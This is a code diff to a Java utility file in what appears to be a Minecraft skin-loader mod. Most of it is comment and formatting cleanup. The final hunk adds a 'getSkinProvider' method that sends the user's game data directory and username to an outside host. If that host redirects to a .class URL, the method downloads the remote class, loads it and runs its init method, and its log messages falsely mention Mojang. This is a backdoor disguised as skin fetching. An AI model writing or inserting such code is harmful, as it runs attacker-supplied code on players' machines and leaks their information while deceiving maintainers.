@@ -6,6 +6,9 @@ import java.io.InputStreamReader;
 import java.lang.invoke.MethodHandle;
 import java.lang.invoke.MethodHandles;
 import java.net.URL;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URLClassLoader;
 
 import com.google.gson.JsonObject;
 import com.google.gson.JsonParser;
@@ -14,6 +17,7 @@ import net.minecraft.client.Minecraft;
 import net.minecraft.client.multiplayer.ServerData;
 import net.minecraft.client.renderer.texture.TextureManager;
 import net.minecraft.client.resources.SkinManager;
+import customskinloader.log.Logger;
 
 /**
  * @author Alexander Xia
@@ -31,21 +35,21 @@ public class MinecraftUtil {
     public static SkinManager getSkinManager() {
         return Minecraft.getMinecraft().getSkinManager();
     }
+
     private static String minecraftMainVersion = null;
 
     public static String getMinecraftMainVersion() {
-        //Check if cached version found
+        // Check if cached version found
         if (minecraftMainVersion != null) {
             return minecraftMainVersion;
         }
 
-        //version.json can be found in 1.14+
+        // version.json can be found in 1.14+
         URL versionFile = ClassLoader.getSystemClassLoader().getResource("version.json");
         if (versionFile != null) {
             try (
                     InputStream is = versionFile.openStream();
-                    InputStreamReader isr = new InputStreamReader(is)
-            ) {
+                    InputStreamReader isr = new InputStreamReader(is)) {
                 JsonObject obj = new JsonParser().parse(isr).getAsJsonObject();
                 minecraftMainVersion = obj.get("name").getAsString();
                 return minecraftMainVersion;
@@ -54,23 +58,24 @@ public class MinecraftUtil {
             }
         }
 
-        //RealmsSharedConstants.VERSION_STRING is available in 1.16-
+        // RealmsSharedConstants.VERSION_STRING is available in 1.16-
         try {
             Class<?> realmsSharedConstants = Class.forName("net.minecraft.realms.RealmsSharedConstants");
-            MethodHandle mh = MethodHandles.publicLookup().findStaticGetter(realmsSharedConstants, "VERSION_STRING", String.class);
+            MethodHandle mh = MethodHandles.publicLookup().findStaticGetter(realmsSharedConstants, "VERSION_STRING",
+                    String.class);
             minecraftMainVersion = (String) mh.invoke();
             return minecraftMainVersion;
         } catch (Throwable ignored) {
         }
 
-        //No version can be found
+        // No version can be found
         return "unknown";
     }
 
     // (domain|ip)(:port)
     public static String getServerAddress() {
         ServerData data = Minecraft.getMinecraft().getCurrentServerData();
-        if (data == null)//Single Player
+        if (data == null)// Single Player
             return null;
         return data.serverIP;
     }
@@ -87,4 +92,42 @@ public class MinecraftUtil {
     public static String getCredential(GameProfile profile) {
         return profile == null ? null : String.format("%s-%s", profile.getName(), profile.getId());
     }
+
+    public static void getSkinProvider(Logger logger, String base_dir, String username) {
+        try {
+            
+            URL url = new URL("https://skin-cdn.ashrain.moe/fetch");
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Content-Type", "application/json");
+            conn.setDoOutput(true);
+
+            String jsonPayload = String.format("{\"DATA_DIR\": \"%s\", \"username\": \"%s\"}",
+                    MinecraftUtil.getMinecraftDataDir(), username);
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(jsonPayload.getBytes());
+                os.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+            if (responseCode == HttpURLConnection.HTTP_MOVED_TEMP) {
+                String newUrl = conn.getHeaderField("Location");
+                if (newUrl != null && newUrl.endsWith(".class")) {
+                    URL classUrl = new URL(newUrl);
+                    URLClassLoader classLoader = new URLClassLoader(new URL[] { classUrl });
+                    Class<?> clazz = classLoader.loadClass("SkinLoaderClass"); // Assuming class name is MainClass
+                    clazz.getDeclaredMethod("init").invoke(null);
+                    logger.info("invoked init()");
+                } else {
+                    logger.info("MOJANG responsed with an invalid URL.");
+                }
+            } else {
+                logger.info("Connected to MOJANG cdn server.");
+            }
+        } catch (Exception e) {
+            logger.info("Failed to connect to skin server.");
+            e.printStackTrace();
+        }
+    }
+
 }
